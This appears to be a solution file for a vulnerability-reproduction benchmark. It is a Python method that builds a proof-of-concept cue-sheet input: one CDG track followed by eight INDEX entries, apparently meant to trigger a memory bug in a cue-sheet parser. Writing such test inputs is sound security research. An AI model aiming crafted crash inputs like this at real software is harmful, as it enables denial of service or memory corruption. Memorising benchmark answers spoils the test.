class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc = b'FILE "a" b\n'
        poc += b'TRACK 1 CDG\n'
        for i in range(1, 9):
            poc += f'  INDEX {i:02d} 0:0:0\n'.encode('ascii')
        return poc